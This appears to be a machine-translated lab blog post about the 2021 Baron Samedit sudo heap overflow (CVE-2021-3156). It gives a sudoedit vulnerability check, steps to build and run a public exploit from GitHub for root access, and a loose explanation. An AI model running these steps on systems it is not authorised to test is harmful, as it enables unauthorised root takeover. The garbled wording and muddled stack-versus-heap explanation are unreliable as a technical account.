---
categories:
- Laboratories
date: 2025-01-11 13:01:50 +0100
lang: en
original_lang: es
tags:
- Linux
- privilege escalation
- vulnerability
- cve-2021-3156
title: Baron Samedit - Scaling privileges in Linux
---

In January 2021, Qualys published an article on his blog explaining a new critical vulnerability in Unix's sudo program.

This vulnerability was a memory overflow in the heap buffer overflow that allowed any user to get root privileges, without the system having incorrect settings. The worrying thing about this failure is that it works with the default configuration and affects any user, regardless of the permissions you have set in sudo. Although vulnerability was already corrected, it affects the unupdated versions of the sudo program between 1.8.2 and 1.8.31p2, and between 1.9.0 and 1.9.5p1, which means that this failure was present for a decade.

The problem was quickly solved, and the parched versions were soon distributed in the official repositories, so the updated systems are no longer vulnerable. However, in systems that have not yet been updated, this vulnerability remains very dangerous.

This vulnerability, like the CVE-2019-18634, is related to a memory overflow in the sudo program. However, in this case, it is an overflow in the heap, not in the stack, as in the previous case. The stack is a part of the memory that organizes and manages key program data strictly, while the pile is a more flexible memory space, used for dynamic assignment. Although we will not deepen the technical details to keep the content accessible, the important thing is to understand that this vulnerability is extremely powerful and affects a large number of systems.

## Comprobación

First we check if the system is vulnerable:

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

! [If the system is vulnearble we get a memory corruption error] (/ assets / img / posts / baron _ samedit / 20250111 _ 130150 _ 2025-01-11 _ 14-01.png)
_ If the system is vulnearble we get a memory corruption error _

This PoC was discovered by lockedbyte:

[Github] (https: / / github.com / lockedbyte / CVE-Exploits / tree / master / CVE-2021-3156)

## Explotación

When Qualys announced this vulnerability, he did not provide the full code to exploit it. However, other researchers soon managed to recreate the failure. The first fully functional explosion that was published was developed by a researcher named bl4sty, and its code is available in Github. In this practice, we will use that explosion to take advantage of vulnerability.

[Github] (https: / / github.com / blasty / CVE-2021-3156)

With the cloned repository we must compile the PoC:

```bash
make
```

! [Explosion Compilation] (/ assets / img / posts / baron _ samedit / 20250111 _ 130714 _ 2025-01-11 _ 14-07.png)

```bash
ls -la
```

! [File list] (/ assets / img / posts / baron _ samedit / 20250111 _ 130918 _ 2025-01-11 _ 14-09.png)

```bash
./sudo-hax-me-a-sandwich
```

! [Explosion execution] (/ assets / img / posts / baron _ samedit / 20250111 _ 131028 _ 2025-01-11 _ 14-10.png)

As we have to select the system version we can verify which is as follows:

```bash
cat /etc/issue
```

! [Version verification] (/ assets / img / posts / baron _ samedit / 20250111 _ 131601 _ 2025-01-11 _ 14-15.png)

Now that we know the specific verion we run the explosion:

```bash
./sudo-hax-me-a-sandwich 0
```

! [Final execution of the explosion] (/ assets / img / posts / baron _ samedit / 20250111 _ 131727 _ 2025-01-11 _ 14-17.png)

## Explicación

### Explicación del Heap Buffer Overflow

A heap buffer overflow occurs when a program writes more data on a buffer (a memory area) than it can handle. Heap is a region of memory used for dynamic memory allocation, that is, when the program needs to reserve memory flexibly during its execution.

### El funcionamiento de la vulnerabilidad

The error originates in the way that sudo handles certain arguments of the command line when used to run other programs. sudo has an internal function that processes these arguments, and that's where the overflow occurs.

Normally, when you use sudo, it is responsible for verifying that the user has the necessary permissions to run the command. If all is well, the command is run with high privileges.

The failure is related to how sudo handles memory for the arguments of an running command. Due to a buffer overflow in the heap, a critical memory area can be overwritten, allowing an attacker to modify the program's control flow. In other words, the attacker can inject arbitrary code into the memory of the program and change its behavior.

### Cómo se explota

To exploit this vulnerability, an attacker sends a malicious entry into sudo that causes the bufer overflow in the heap. This overflow could corrupt key data in the program memory, such as the return direction of a function or control variables, allowing the attacker to run arbitrary code.

In this case, the attacker does not need to be in a group with sudo privileges, because the failure does not depend on the sudoers configuration (the file that determines who can use sudo), but on a defect in the management of the sudo memory.

### Estructura de control del flujo (return address)

One of the main objectives of a buffer overflow is to overwrite the return direction of a function.

This address is stored in the stack, and when a function is finished running, the program returns to the direction that is in the return variable to continue the execution.

By overwriting the return direction, the program can be made to jump into an arbitrary memory direction, rather than normal return to the function that called it.

It allows the attacker to redirect the program execution to malicious code.

### Variables de control de seguridad (como los punteros a funciones)

The functions within sudo perform several safety checks to ensure that the user has the right permissions. An attacker may attempt to overwrite variables related to access control, such as points to the functions that these verifications perform.

If these pointers are overwritten, it could cause the program to call malicious functions rather than permit verification functions, allowing for the escalation of privileges.

They allow the attacker to avoid permit checks and execute commands with high privileges.

### Memoria relacionada con la configuración de sudoers

Potentially allows the attacker to manipulate settings to run commands without permission.

### Buffers de argumentos de comando

They allow the injection of malicious commands to run as root.

### Punteros a la memoria en el heap

They allow the execution to be redirected to code controlled by the attacker.

This is a summary of the concept as simple as possible to understand the operation of it.